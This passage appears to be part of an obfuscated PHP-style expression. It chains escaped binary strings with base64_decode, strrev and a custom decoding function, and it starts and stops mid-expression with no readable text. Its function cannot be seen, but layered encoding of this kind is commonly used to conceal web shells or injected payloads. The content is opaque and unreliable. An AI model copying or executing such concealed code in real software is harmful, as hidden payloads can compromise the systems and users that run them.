42\321\100\133\230\65\5\141\45\4\43".base64_decode('bSEa2POTm17fcdaei7dP/HALqmj3RSfvvuA2xAxhBmj7mXvuPWv3T27YfSYwLso=')."\336\33\156\177\375\236\373\366\374\344\352\211\355\77\335\175\376\235\173\56\72\225\46\274\161\315\115\23\147\134\315\33\246\274\161\356\275\273\317\272\222\63\105\224\27\362\240"."\xd2\x6f\x9c\xb6\x65\xcf\x3d\xdb\x31\x4b\xf4\x8b\x13\x77\xdf\xba\x79\xf7\xd6\x2d\x13\x67\x5c\x36\x71\xe1\xd5\x7b\xce\xba\x61\xe2\xf2\x53\x26\xbe\xbf\x65\xef\xd\xe7\x1d\xe3\x46\x24\x1a\x5f".base64_decode('y6YCbB78J/Rb0+vo8PZbM/DQ1qPfOnwXAv0yk25i9bu8L9jTFnTfLZKj4ONgOsU=')."\x10\x6a\xc5\x2\xfc\xab\x5\x3e\x12\x58\x3c\x41\xee\x8c\xd5\x4e\xda\x8a\x8d\x30\xff\x52\xa3\xa4\xc6\xb4\x7\x63\x6d\xd1\x50\x6b\x10\xac\xed\xf9\x44\x4d\x23\x1c\x1c\x58\x44\x20\x68\x2c\xba"."\202\207\371\165\272\12\237\24\112\35\103\346\172\305\321\21\325\227\62\362\345\102\221\64\126\251\301\326\40\65\36\114\155\310\105\47\245\6\357\322\10\240\245\320\322\253\303"."\xf7\xd6\x89\xb9\x6e\xed\xea\x5a\x4f\x83\xa7\xb1\x5e\x1\x87\x15\xb4\x4\xb8\xa9\x50\x6a\xc0\xe8\x9b\x97\x73\x7c\xc4\x93\x74\xc4\x1a\x3d\xd\xf5\x4a\x4d\x69\xa8\x6\xda\x25\xc6\x15\xb5\x3e"."\101\163\132\212\352\251\203\6\313\315\25\171\21\65\263\154\123\325\21\171\123\122\36\16\342\345\321\257\303\365\104\312\47\112\320\171\102\71\334\60\45\320\323\356\314\111\75"."\126\364\326\22\13\312\224\217\216\257\74\315\265\365\112\22\356\60\124\111\44\305\34\203\321\354\30\214\272\31\100\47\172\73\371\174\323\13\12\12\275\277\106\233\245\132\154"."\xa2\x0\x4a\xa6\xa\x43\xe9\x6c\xb1\xbc\x6\xea\x6\x9a\x1c\x9a\x1f\x5\x78\xa\x36\xe5\xe7\x35\x21\x72\xc4\x13\xd8\xc\x62\x38\x9f\xc4\x2a\x69\xc4\x95\x48\xd\xe5\x32\x69\x3f\xb\x56\x96"._kodDe('LSuCUmGuwuiL0nKzow7Jed/Q9fy1zLcZq7iHJRUYQCqYRgGY/THTHwIxm6svIU0y')."\230\102\362\205\172\72\42\321\156\172\3\55\326\326\25\354\16\370\200\210\123\114\240\371\61\57\247\64\53\265\230\362\121\120\255\143\370\311\207\330\220\305\311\127\321\272\112"."\330\210\61\243\243\120\312\102\143\140\366\25\162\13\131\45\105\232\153\351\205\177\250\222\173\314\211\104\343\11\64\0\100\236\45\252\133\53\355\26\222\115\67\276\110\65\302".strrev('"(+¤ª°¯¾£|!£Ú™6”¾	k¶]ˆGOH¶Î¸åPud çæÉâŒd').strrev('¿pó¶W}AA£`Š4Ì±ûø@$¹Á³|"–ÄE=ğ\'µqaæš4¤P/ì').base64_decode('KYsTIlEpEogGumM8Gl3J73BwGL3Lkejp6xYUPxxYgZAlIhgURq3rfNNb6vvpfTg=').base64_decode('GqQ/S1gM3xEa2NDoUeZuqoc87AZZws7pRcb34q8sDyfCkU4aJ56JgsW0kHeUtQo=').base64_decode('YsLjggm32NbFV4OCcFihl2yVnsjKgHB2IyUARPi+8Z+wtn+034eYBWuduN/W3qo=')."\60\66\244\215\350\13\250\132\1\112\7\330\66\272\316\3\73\106\42\157\144\231\263\12\104\20\31\273\100\177\127\261\0\241\225\120\0\11\321\245\74\273\350\106\157\330\45".base64_decode('+jf2H9/v9dFLhZh56feIJiWCq9AeG4s5bkQmiPsWqB31EkJ01dLIIvgB6W4RsKc=').base64_decode('EF3czCczuHxjD/rXGd8YRP/C6CccR9Ol8wxoSYZDy4Ib8X8ioZ4PJL1K5CwQ6tk=')."\x88\xfe\x47\x4\x66\x63\xa8\xc7\x5d\x59\x6b\x30\xbe\x32\x18\xa4\x19\x58\x18\x7e\x45\x56\x44\x70\xa0\xab\x92\xe7\x2a\x6c\xdd\xf\xc9\xc2\xda\x1f\xaa\x4e\x24\xea\xc8\x60\x7a\x7\x66\xd4\x27"."\x12\x7e\xab\xf\xf0\x85\xfb\x1c\xa8\xab\x3d\xae\xb1\x16\xf6\x90\x40\xac\x4d\x50\x5f\x7\x42\x54\xe2\x2\xb1\xc5\x77\x22\x2\xf7\xc7\x4\xf1\xce\x68\xa4\xaf\x57\x8a\x77\x5\x56\x84\x7a\x3a"."\131\314\77\235\205\246\103\325\112\173\50\206\206\250\215\41\243\160\23\45\307\201\341\44\154\221\314\365\72\120\272\35\121\166\24\221\130\166\54\14\120\312\354\134\145\255\175"."\241\160\273\174\11\34\147\204\15\205\120\165\330\123\246\261\306\261\70\271\16\316\42\170\310\131\230\240\33\213\220\61\140\21\72\0\54\106\206\213\105\210\73\52\26\41\35".base64_decode('ZREsnQR7WBqSV5GsyYTQnDrCbzEuTCcljwOYBvuoJg67pUBSnMr1pS5lK9F7Sao=')."\5\152\253\247\110\227\251\375\24\204\270\115\2\104\277\375\353\132\10\67\274\216\41\46\275\261\153\307\165\73\357\370\12\334\354\103\137\11\221\353\224\322\167\330\105\10\242"."\145\114\30\222\246\233\154\324\62\100\350\265\250\132\34\124\310\102\75\204\155\24\211\162\231\106\235\42\24\247\113\353\270\144\4\136\20\74\360\13\55\72\210\376\364\103\224"."\251\105\340\216\113\255\7\66\131\166\41\302\51\35\367\367\327\114\66\132\220\201\215\31\104\153\150\224\225\322\371\236\227\312\141\317\25\11\273\300\324\352\104\70\23\12\154"."\252\4\27\361\366\150\244\227\162\40\112\250\103\241\176\21\224\132\252\66\257\5\326\252\55\32\304\253\203\346\142\151\165\265\16\205\327\342\132\5\56\111\327\73\113\205\172"."\xda\x83\xab\x94\x5a\x3d\x3d\x96\x50\xd5\x4\x14\x56\xd0\x5a\x64\x15\x29\x15\x35\xb1\x1a\x68\x5b\xe1\x9c\xca\xca\x19\xa3\x8a\x8c\x5e\x4c\x5e\x6e\xa3\xb0\xb8\x40\xb9\xa\xd6\x8c\x78\x38\x60".strrev('€4xªà¤Ñ KP©Ağ±'."\0".'ˆîzÈÌ-ÒJ)é0áØmP¤ÓÊó” =R')."\x81\x84\xfb\x3c\x60\xa\xfa\x43\x8\xa\x96\x8e\xcc\x82\x4a\x2f\x6d\x12\x9e\xcd\xb7\xe\x94\x4\xeb\x1c\x2c\x22\x65\x1e\x31\x93\x8\x18\x44\xb6\x3c\xa9\x4f\x3c\x85\x68\xa\xe8\x30\xcb\x7a"."\x84\x65\xc0\x75\xd3\x58\x6f\x34\xd4\x1d\x88\xae\x86\x21\x13\x32\x0\xac\x40\x23\xef\xb8\xab\x2b\x22\xba\xd5\x27\xdd\x16\xef\x41\xad\x96\x6f\x8f\xd3\x39\xe6\x14\x16\xc9\xb3\x8c\xc2\xa2\xd6"."\xc0\x2\xc0\x33\xf\xc\xf\xf5\x1e\x98\xe0\x97\x81\x99\x12\xa5\x8e\xdd\xb1\xf5\xb0\x0\x73\xca\x40\xae\x2d\x31\xad\x59\x1\x91\x1c\x1e\x13\xb3\x6\xb8\xf\xb3\x22\xa7\xca\xf7\xaf\x84\x7b"."\x43\xbc\x49\xe2\x49\x66\xd4\xbe\x23\xd0\x17\x96\x21\x30\x54\xca\xb2\xe0\xea\xcf\x58\x23\xac\xa5\xd5\xd6\x8\x4b\x63\xea\x18\xbe\xda\xa0\x3f\x75\x73\xa0\x7f\xd4\x4f\x44\xdd\x4c\x24\x93\x96".strrev('åã]jX×F~E}ÀÎ'."\r".'P)<·rJö¥X|G¡ÍLA¢?Ú‘âû[Ø*Ğj_r-–‹')."\271\346\51\330\323\31\352\11\66\167\217\207\142\201\156\205\65\34\164\153\330\215\332\174\250\47\24\111\204\21\117\234\220\325\147\241\10\250\221\175\111\331\111\110\102\370\32"."\361\251\302\156\333\66\313\222\7\77\142\303\215\346\77\40\134\12\160\315\66\111\53\47\161\146\151\327\320\215\46\174\154\201\241\224\373\130\310\260\245\304\56\233\203\147\103".base64_decode('t4G1DBY22vychZmGI3JVcBTok+7+q2nJIFthXyYHQEWnFz60IeYT2A0HkvcSmmg=').strrev('©¼b*g\'z²K8ºâíÖ$Ò³f4Çh¹U•½°eì‚Âs´¤L~,³A').base64_decode('A0hXQagpxDsu5RLAsHAriI8zRJ0DTEYXnVyvl9znF0WjVzMLOjmnWSmu1PB0qTQ=')."\271\314\144\174\326\340\226\213\350\13\275\174\146\275\215\54\63\163\34\113\20\106\341\2\52\277\47\202\246\224\224\225\56\22\20\46\11\252\65\341\304\364\30\127\343\154\303"."\xe8\x56\x8b\xe3\x71\x63\x85\xae\x1\x9a\xb6\x47\x56\xf6\x84\x23\xcc\x25\x1a\x73\xa5\x48\x63\x59\xb0\x6f\x40\x1c\x89\xe9\x63\x11\x9b\x5\x4c\x76\x63\x6a\x25\x63\xdb\x31\x37\x21\xf9\xdb\x3d"."\106\306\1\62\231\2\47\3\321\266\56\44\202\47\72\102\150\17\101\33\224\250\240\13\25\105\322\275\64\115\22\264\233\171\16\102\374\43\336\104\303\314\14\13\337\153\320"."\x6c\xf0\x8f\xe5\x58\xc0\xa1\x8\x94\xf5\x69\xf8\x4a\x10\xbd\x96\x81\xaf\x6d\xf1\x82\xd4\x37\xd4\xe7\x17\xea\x93\xbc\x50\x4e\xb2\x36\xab\x96\x6b\x83\x8c\xfc\x83\x26\xd1\xa7\x7c\xfe\x7\xa3".base64_decode('mtgWUTFyA+tzCwlHqORLpJBEt1xlCALR+yMw1zlIFq5+ELHsiSS6ED2OsF1bt+I=')."\xe\xfa\xc7\x4a\xc1\x6a\xb5\x11\x53\x91\xf2\x93\x2b\xab\x20\x13\x2d\x24\x7\x37\xf4\x98\x10\xe4\xac\xd\x88\x4\xf2\x10\x33\x8c\x0\x47\x54\x62\xb7\xc\xd0\x9f\xd5\x85\xb4\x17\x35\x1c\xcc".strrev('EŠ)>'."\0".']§\'Ç¸çeJèû'."\n".'‡b¸_'."\r".'ÔùJ@œ~IÜUá'."\0".'ÍšÒ,').base64_decode('+qLsOAPHyd3PaLBtNT9Z4NCOwAo3BK+BeKCzKpgrhzCcSGGJaARr0YLhDleBWBc=').base64_decode('d47ohCXCoZ5lVRPQXt4tFaHAUDzY7YY5a4gF8foV8dZwpE1KDkUqR4IzCxxIdXA=').strrev('€“~èÅ°tKt‰éDÇ\\é¾-ıúëê›ı-úÉou…ˆŞ‘4š#®¡?è')."\267\14\6\244\305\40\346\367\371\340\43\74\340\357\367\163\257\123\214\214\202\263\332\30\365\317\343\150\205\313\241\5\273\113\356\163\73\160\14\321\43\307\104\154\165\214\217"."\66\105\305\152\351\16\374\242\331\144\53\3\127\146\364\257\127\316\212\15\133\252\146\164\40\250\343\256\255\14\362\351\206\130\13\142\321\246\215\124\31\273\0\22\43\56\266"."\x19\x4\xf2\x39\xaa\x40\xe4\x7a\x48\x48\xb9\xb0\xe6\x62\x6c\x6d\x16\xd1\xb6\x3\x3b\x62\x1b\x62\xda\x3a\xbb\x42\x4b\x97\x85\xbb\x7b\x22\xbd\xcb\xa3\xb1\x78\xdf\x8a\x95\xab\x56\xaf\x81\xd1"."\145\50\220\121\274\314\203\27\270\206\364\217\250\246\177\204\171\46\136\201\171\156\315\362\313\74\17\7\242\76\42\162\307\210\225\237\212\342\74\25\323\6\177\365\44\132\233".base64_decode('v1C0GyfJ0WtqScOwJ0ld0f3ZFUPi2n5rgOGcP62N+AW3wkgYlzRgv/bKHpIxeso=')."\214\127\72\351\332\174\1\220\347\234\223\264\105\13\340\114\146\302\267\332\133\360\246\373\343\235\330\277\143\377\32\76\327\272\51\71\130\114\31\305\264\56\135\376\127\123\214"."\307\52\247\206\370\335\172\114\375\55\357\250\316\260\351\70\56\176\201\45\123\102\115\121\161\124\262\342\33\366\142\151\304\253\346\263\6\342\267\162\5\6\125\207\34\351\302".strrev('1­§r4V¹u—¼ƒpË²1/&<X*-Ü'."\n".'ÖÅlåQ™£JB}°ÚçÌëÈÉgµ')."\322\211\46\145\66\170\51\356\100\214\257\164\245\222\371\226\25\162\43\146\235\210\143\136\32\365\50\302\327\71\123\127\126\347\353\260\242\111\272\43\232\222\175\1\60\142\134"."\x18\x12\x26\x1c\x85\x21\x6e\x30\x91\x72\x30\x27\x98\xf\x10\x31\x53\xe2\x3f\xc0\xcb\x38\x4a\x6b\x1d\x67\x66\x54\x70\xbd\xb3\x75\x3c\x2a\xbd\x9a\x50\x2e\xe6\x2b\x59\x79\xec\xa0\x41\x76\xda"."\x1e\x58\x19\x9b\xed\xed\xea\xe\xb4\x79\xd1\xf6\x32\x73\xce\x5c\xbe\xc9\xf7\xc7\xd1\x2e\xcf\x90\x4c\x1d\xb5\x66\x33\xd9\x83\x42\x66\xcc\x55\x72\x68\x56\x0\x7b\x2a\xdd\xa1\x1e\xe7\x74\x3"."\114\201\324\277\147\312\324\322\330\300\205\161\225\24\352\302\52\12\24\64\203\306\251\337\70\146\2\226\123\171\203\161\67\200\156\125\371\356\252\252\337\135\125\355\273\253\134"."\337\135\125\371\135\12\162\141\257\132\52\265\345\60\136\70\50\253\3\224\222\43\154\127\313\140\23\35\331\14\10\264\234\324\266\327\207\222\333\51\203\235\346\371\55\21\342"."\x2b\x24\x23\xad\x1d\x47\x75\x3e\x20\xff\x69\xb6\x89\x5a\x8c\xa0\xe5\x55\xcb\x5e\xe1\xf0\x1f\xf4\xb9\x4e\x7b\xb1\x93\x8b\x6e\x2e\x12\x71\x3e\xd6\x6f\x58\x96\x1f\xbb\x2c\x24\xdc\x3b\x37\x62"."\213\304\330\71\216\263\117\324\352\107\222\300\301\211\32\367\50\313\375\315\12\247\264\124\375\116\303\101\356\367\5\11\41\201\54\366\335\201\150\36\214\112\160\254\144\130\232"."\xec\xd\x39\xad\x11\x17\x9a\xfc\xee\xbb\xe4\x3a\xb8\xa0\x8e\x61\xaa\xc4\x6c\xfb\x24\x27\xc2\xcc\x25\xaf\xec\xbf\x10\xf\x98\xb7\xe0\x70\x70\x3e\xe6\x45\x5d\x77\xb9\xe1\xb5\x34\x6d\x88\x9"."\x9b\x92\x40\xc2\x15\x4\xbd\xdc\xbd\xae\xbb\x3b\x98\x2c\x8\x2\x69\x72\xd7\xcb\xf4\xe4\xd6\x5b\x15\xe0\x95\xbc\x49\x50\xca\x20\xb9\xe2\x46\xed\x82\xaa\x71\x33\x61\xfd\xe6\xc8\xd8\x30\xa5".base64_decode('Av1ZU63XXlP4O0ZzSR3oL9PGmS9h1wpwuR/u7+zv7o/Lw2SbaiaDmi15NHW0RXg=')."\x3b\x6\xf4\x23\x3e\xef\xd9\x60\x4c\xee\x2b\x19\xe\x28\x8e\xaf\xea\x6a\x19\x12\x89\x4\xe2\x37\x89\xb9\x9c\x67\x34\xc1\x31\x97\x3c\xa4\x51\x5\x77\x97\x63\x38\x60\x6f\x46\xd8\xd8\x95\xca"."\322\133\56\62\276\340\55\235\33\265\141\5\3\365\120\315\110\6\361\34\15\136\350\233\131\217\320\320\25\133\215\64\354\217\33\152\20\46\326\64\325\34\127\207\176\353\153"."\x3c\x35\x98\x51\x25\x71\x3c\x8b\x18\x40\xda\x51\xd3\x74\x5c\x1d\x9\xd4\x83\x17\x96\xf5\x70\x15\x43\x72\xde\x2a\x4e\xc5\x41\xb5\xd0\x82\x86\x56\x3a\xca\x69\x21\xa3\x81\xd7\xfe\x4c\xff\x4c"."\377\50\320\203\226\141\374\105\361\212\204\173\17\30\113\40\262\307\216\50\22\62\361\5\262\16\243\56\247\164\361\226\60\262\334\335\76\207\121\321\100\367\32\257\160\247\274"."\250\145\254\220\127\100\352\154\256\155\364\65\324\52\354\331\221\346\332\276\170\207\167\176\155\313\342\3\26\265\221\203\135\133\353\306\47\263\330\125\65\125\6\54\206\203\227"."\x45\x78\x79\xf1\x88\xdf\x19\x9b\xac\x2c\xe0\x5f\x41\x5d\x6f\x14\xd1\x56\x87\x28\x54\xc1\x97\xe2\x1e\x43\x99\x59\x25\x8d\xf7\x71\xaa\x26\x3c\x5e\x17\x35\x7b\xd4\x30\xe1\x14\x1b\x8\xee\xcc"."\206\331\62\216\3\312\130\154\251\23\377\16\115\130\167\311\206\243\257\64\136\56\172\261\212\302\33\223\135\362\271\374\351\67\70\363\143\45\203\63\277\114\52\123\202\234\24"."\104\220\276\215\320\244\310\17\146\110\376\204\275\230\107\240\253\224\351\273\0\206\251\50\3\351\262\167\146\206\347\230\104\46\234\44\162\211\253\275\170\350\275\210\41\303\353".strrev('56«È±²zz½¾x½â.ÆN8ÜC•í“ÁG¸5oÜWÎ,µZÛ´2-')."\250\123\55\113\137\131\117\273\77\111\14\7\274\345\62\373\140\325\112\145\131\201\145\40\235\10\361\372\34\134\273\212\346\232\63\352\156\306\137\322\51\127\272\135\107\213\131".base64_decode('mTmrac4C9BfIJbN7KJeYXTUKMrfsx/gzjC6IZxpY3/CES37sHWAxjHzFM4LiyCc=')."\132\353\170\0\4\72\112\345\171\311\337\76\121\176\323\225\204\255\201\22\374\375\202\52\224\25\11\152\154\3\201\155\130\142\204\371\204\144\131\300\344\371\125\261\104\222\371"."\x21\xd1\x93\x24\x36\x21\x7\xc\x1f\x42\xd\x35\x4\xdb\x45\xb6\x60\x49\xd3\x9c\xca\x95\x8b\x43\xcd\x52\xa2\x62\x1b\x86\x52\x50\x8b\xe3\x20\x29\x4c\xb3\x9a\xa6\x59\xb\xf1\x87\x9a\xa7\xf9"."\x66\x67\x2c\x14\x1\xfa\xcd\xbd\xd1\xe2\x7d\x45\x38\x1f\xa4\x6e\x74\x20\x85\xaa\xfa\x7d\xf8\xe1\x10\x1f\xde\xb4\xa2\x65\x76\x95\x8b\x28\xfa\x80\xc1\xc8\x97\xf9\x23\x11\x25\x12\x86\xd6\xf6"."\206\373\72\103\75\222\1\223\4\110\264\265\367\44\2\275\275\125\23\344\157\370\361\351\277\157\220\275\215\224\142\30\266\110\57\144\225\24\276\143\321\134\203\241\65\212\145".base64_decode('pph/3ho/0FiSQchZi3QoUouLKBmEMl4Sosm1ixf59cV84IUDI9MQV0h8/mOx1OU=')."\xc7\x26\x42\xc5\xe3\xf1\x4c\xcb\x16\xb\x4\xda\x21\xdc\x15\x29\xca\x22\x55\xa1\x63\xda\x5c\x8b\xed\x37\x32\xb5\x4a\xe\xed\xd5\xdc\x3e\x72\xb1\xbb\x70\xf\x3b\x47\x5a\xe4\x57\xe5\x44\xbc"."\312\242\6\143\215\271\200\65\302\25\372\125\117\52\2\222\67\157\362\250\103\233\132\134\121\131\4\127\356\113\311\111\164\46\311\45\227\312\374\176\242\61\360\13\271\322\171"."\x74\xc3\x4f\x3b\xaa\x20\x85\x4f\xbc\xb2\xa4\xa6\x86\x30\x76\x89\xad\x0\xbe\x9\x9\xbd\x58\x7c\xa1\x9\x8e\x57\xa\x6c\xc9\x44\xa3\x8c\x2f\x7c\x11\x85\xbc\x29\x9e\x5a\xd9\xb0\x81\x56\x84".base64_decode('uYFNmyphYOXpTgqUdDcIY44bhkVzAUN7mvMzFGvlTALC8tBfUSbc0ykiVFxxJK4=').base64_decode('ZQbVJNa/ttY3fdMmv85soZjdBivr47lpvN/nzI96AkPPMwLAnZPylkth8R3gny4=')."\x2e\xa9\x71\x9b\x27\x5\x1b\x42\x35\x37\x2f\x5e\xcb\xcf\x7f\x6\x58\x1a\x63\x10\xf5\xc6\xf9\x6c\xfa\xd7\xe7\xbc\xf1\x95\x3c\xd8\xd6\x23\x58\x60\x8e\xe4\x94\x9e\xf8\x88\x5a\x25\xe0\xf4\xf0".base64_decode('2zLCHwmRKRANB0olOcpexiFnEXk96eernZ5P+FLibhfLQmiNC44NllwJ+MYKAY8=')."\40\302\210\70\260\101\67\34\325\305\201\74\260\310\112\231\172\311\166\320\51\372\36\140\15\171\304\145\120\35\121\151\226\32\5\144\367\346\32\342\304\276\6\321\45\232\2".strrev('UÂ‹êOË~A6¶™ˆùPXê0£X*ûTÄ„ò¡¦œ­sHk›å©Š@&e4A')."\210\100\17\234\377\0\173\165\354\11\364\367\270\143\31\242\220\267\274\362\232\111\355\275\11\325\41\47\202\31\241\373\202\327\234\172\243\221\170\244\215\75\210\123\115\111\66"."\x9b\xf1\xb2\x16\xbd\x16\x27\x64\x20\x76\x6b\x87\x9b\x45\xb0\x1c\x9c\x3b\xf0\x3\x4\xa6\xdf\x2c\x17\x8b\xdc\xc2\xc\xb3\x8b\xf2\x16\x86\xaf\x12\xc1\x1a\xa0\xa7\x6b\xb1\x5c\xd9\x16\x5b\x21"."\366\170\37\307\367\175\55\0\113\256\5\261\143\103\124\170\55\325\127\66\67\260\213\27\314\50\115\334\22\143\71\311\31\51\241\312\305\354\200\43\251\112\365\124\115\34\347"."\xf6\x60\x5a\xd1\xa1\x15\xa1\xcd\xca\x1b\xcc\x11\xe3\xcc\x86\x86\x6\x6f\x43\x23\xfa\xcb\xf\x8c\x81\x6b\x6b\x6a\x68\xa8\xc8\xd2\xd0\xd0\x44\xfe\xd2\x4\xa2\xe4\x85\xb9\x70\xa6\xa0\xa5\xcf"."\150\26\144\30\325\64\150\20\154\10\5\275\130\146\214\325\332\66\174\365\113\301\115\33\140\274\4\153\77\232\6\342\37\221\221\217\205\222\170\270\120\41\7\222\20\323\334".base64_decode('g8BPemFi2T6M6QULI/4GjSoZFGgvv0uIsgn0WUivbjbzRgWL6bXyx3xscClQuHY=').base64_decode('9rIEr/ySAhSiG4M45nA0DZVxOl7EELRBp3g/MUDSomBmTXImiaPyaQZJ5lf3SCw=')."\317\175\3\340\150\17\257\211\76\330\101\57\315\301\30\126\301\344\234\61\232\20\173\60\216\56\345\61\62\244\130\154\142\150\230\226\256\127\342\161\145\324\230\241\35\263\123"."\x0\xb3\x7\x72\x5d\x7e\x48\xcf\x3b\x2e\x9\x27\xa4\xba\xe5\xd1\x5c\x88\x33\xca\xa3\x84\xd6\x6a\x80\xbf\x4c\x42\x8d\xa\xd9\xe7\x15\x58\x78\xc0\x1f\xe0\x2d\x82\x3c\x20\x47\xed\x40\x9b\xe".base64_decode('qJg/2z13ZBpMQ1zxrXhPlMWkyWBK89jnWOUwSJABqB1LG3e1KFXgTnKVCaSlFy8=').base64_decode('LeFjsY07eJUdL9Jzf8k6xAJ38+Kgn9UxIsk6vpJpZNHsWHJfEby3Ophnr8xZJRM=')."\357\220\234\117\6\342\63\13\366\372\42\40\232\270\35\254\212\207\140\245\254\102\101\42\1\235\353\114\112\150\343\357\376\310\100\54\73\311\246\35\304\50\326\131\7\26\312"."\234\20\336\262\317\300\25\46\114\333\360\122\247\154\22\110\263\11\132\201\25\35\262\172\126\67\230\325\10\36\15\161\202\353\204\123\30\25\155\35\207\76\161\102\156\362\32"."\173\44\24\10\22\301\173\134\1\261\256\161\15\240\300\125\130\135\315\315\162\61\147\332\153\337\377\21\13\234\313\162\341\41\344\232\72\131\205\215\207\57\41\153\35\360\242".strrev('—6g<M(´Å/Q(÷Ö\\;ÚÍ,N1f$1I œMq´Ù`Ub\':AVSoâë').base64_decode('LHB6IC1R5LDMO8RpEe9i8R3HiZfkk5lnRbsN+7rKdiBiykUeHZCEHVfUbe5Fdgs=')."\x9b\x11\x7c\xe6\xf5\xba\xc8\x5f\x8d\xc2\xd3\x19\x93\xac\x6d\xaa\x7c\x1\xa\xf1\x22\xb0\x8d\x99\x5a\xca\x30\x89\xd4\x2b\xb9\x2d\x28\xda\x51\x2d\x2b\x47\xc3\x6\x97\xf6\xf1\x9\x8b\x56\xa5"."\xa\xec\x29\x46\x42\x71\x8c\x5\x48\xe\x2d\xcb\x7e\x67\x24\x5f\xd8\x28\x26\x79\x29\x97\xd8\x11\x6f\xa3\xc2\xf9\x98\x4\xad\x99\x46\x66\x48\x9\x24\x7f\x35\x96\xc6\xa5\x7f\x92\xee\x13\x10".base64_decode('MTtWTvJjARejwa4oKPI+zu4c4AqICxDcA0tOQ9Viv7eiZ3IR8s2KIjQNb6XCkYY=')."\234\142\41\271\14\17\325\344\51\125\76\105\222\244\21\115\161\167\102\60\72\142\220\40\141\134\143\26\175\336\306\231\136\346\202\116\276\277\300\330\134\240\131\150\55\110\150".base64_decode('gLl9RgfBPA/yiTyGdLhCnGsI5wPEjwifT+JwhMdMad/SuOke8bwhkxVxHk4t+nA=')."\206\276\152\351\164\204\160\162\273\303\340\321\225\1\255\14\147\72\70\70\57\70\336\32\107\170\340\260\232\161\125\2\336\356\145\307\355\244\224\350\207\260\35\105\40\203\272"."\121\227\6\106\234\353\123\237\44\314\350\225\323\45\1\216\33\34\130\151\33\340\343\106\277\160\263\23\236\200\254\253\307\67\73\35\272\225\356\161\176\377\16\133\356\340\115".base64_decode('glteWnKEpXLktBwRaqnkKM1BPNeoxi5pMh1Ab1evn4Na+fKkcqNwhdTGzIHE8+Q=')."\243\5\75\245\204\43\235\241\266\100\270\75\24\133\246\144\65\133\21\106\14\344\265\2\347\122\46\52\57\72\360\14\253\223\334\17\77\16\172\223\210\251\364\246\71\157\155"."\11\56\132\262\327\222\136\43\162\126\113\361\117\63\53\152\54\342\273\27\371\212\62\130\221\127\45\167\136\350\265\244\314\45\123\253\314\77\256\221\107\306\105\213\245\2\345"."\x2a\xad\x81\xfc\xd5\xbf\x40\x9e\x4d\x90\x73\xa3\x8d\x58\x2b\x4e\xd6\x78\xbd\x38\xa2\x5b\xba\x58\xf8\xac\xc4\xb8\x5c\xbb\x50\x55\x9a\xfc\xcd\x88\xb4\xfc\xc4\x84\x34\x3\x62\xb0\xe9\x57\x2a"."\x3d\x71\x81\x1f\x23\xd9\x1\xb9\x4b\x68\xa6\xd3\x24\x7b\x64\x2b\x31\x25\x3c\xbc\x93\x27\xde\x28\x21\x51\xe9\xf5\x98\x92\xa9\xea\x96\x26\x1\xe8\x33\x26\xd3\xe1\x4a\x3\x12\xf1\x1d\xaf\xbf"."\345\63\122\264\354\334\101\253\176\52\101\77\300\140\222\323\267\152\31\242\370\11\357\377\161\123\365\264\160\276\244\247\231\155\0\277\201\106\175\333\267\311\57\5\262\157\126"."\xbc\x90\xf3\xb9\x6f\xed\x78\x24\x87\x30\xc4\x91\xd\x7b\xd0\xcb\x20\x2c\x36\xf0\x84\x14\x16\x8a\x24\xa8\x17\x17\xf1\x9\x24\xb3\x99\xe3\x25\xf9\xdc\xc8\x9f\xf6\xf3\x21\xa6\x1\xec\x63\x2e".base64_decode('yJTGOCIYYJwdasOfoyIQEsiw9oWxysweEdEDGGfHuanr1SC3uabjMe6Kb2CrL6g=')."\207\350\167\120\316\1\321\71\24\343\357\125\210\242\356\224\52\15\100\311\212\320\140\360\14\112\263\322\100\337\261\342\57\20\50\213\330\175\132\361\1\342\25\52\130\50\331"."\xe\xf1\xb0\x4b\xb6\xd3\x96\xe6\x86\x2\x8\x47\x23\x44\x2\x6c\xe1\x62\x14\xc6\x2b\x0\xe\xb5\x45\x98\xb5\x8b\x9b\xc7\xe1\xf7\x17\x8a\x19\x43\x1e\x3f\x42\x78\xb1\xd1\x3d\x7d\x64\x8e\xca"."\241\36\304\323\153\166\345\273\63\264\370\377\111\101\232\30\223\214\6\235\225\124\66\310\162\157\151\202\275\302\117\352\344\214\121\347\113\163\30\342\176\104\307\361\174\216\264"."\x68\xc8\xb5\x4f\xf9\xc1\x1f\x67\x21\x4f\xc5\x3b\x18\xa\x79\x2a\x54\x41\xa8\xe\xb3\x88\x7d\x5\x39\x5e\x51\x92\x3e\x3d\x8d\xfe\xf4\xc3\x2f\xdb\xb6\xdc\x8d\xa0\x84\xa\x3e\x59\xcf\x91\xaa"."\55\247\347\323\46\67\331\20\200\156\115\10\237\244\24\266\132\120\331\223\250\344\145\256\166\106\223\341\351\215\152\317\54\141\17\157\316\267\104\304\23\55\142\217\164\76\142"."\xc1\xf\x1a\x2d\xb1\x18\x2c\xdb\xf1\x48\x4a\xdc\x88\xab\x59\xf\xe5\xbc\x30\x55\x13\xb1\xd6\x71\x39\x2c\x9b\x6c\x92\x5e\xa0\x44\xa6\xd7\x49\xf3\xf9\x5e\x2c\x65\x60\x4f\x9b\xa5\x3d\xe4\xdd"."\x2d\x4a\xea\xdc\x6f\x7b\x48\x2b\x8d\xd3\x4f\xb9\x74\x36\x6f\x24\xd5\x7c\x94\x5a\x3a\x39\xae\x68\x98\x48\x6a\xe2\xd6\x8b\x8e\x6c\x14\xe4\x57\x4b\xa5\x49\xf\x3f\x28\x10\xe\x42\xca\xc5\x10".strrev('Š†È.€±-‡Ny_Û'."\0".'zC³¸İÎÉW-ºŒô½kèì‚zÜGÈô³FÉ•$¦ ;*U')."\x70\x64\xea\x93\xc5\x26\xc8\xa0\x2c\x52\xc4\x4\x3b\x96\x23\x46\x8\xc4\xbb\x7a\x48\x80\xac\x77\x99\xcd\xfe\xc\x28\xc7\x43\xe7\xeb\x2f\x14\x61\xc9\x4f\xbb\x96\xe1\x32\x7\x8e\x8b\x3d\x59"."\xf6\xef\x20\xce\xea\xdd\x2f\x8e\xb1\xcf\xf0\xe7\xd3\x3c\xb4\x67\xe2\x51\x4c\xfa\x58\x9a\x87\x3f\x8c\xe6\xa1\xee\x0\x3d\xf0\x1c\x9a\x47\xdc\x5e\xfb\xac\x7\x64\xc4\xbb\xb6\xce\xc7\x70\x71"."\233\271\145\137\5\363\357\346\373\371\120\271\12\104\335\3\27\67\52\265\201\342\164\262\130\56\210\363\136\24\161\312\101\25\35\226\172\130\66\363\36\162\66\353\141\136\317".strrev('9º½'."\n".'Ês¨8·S	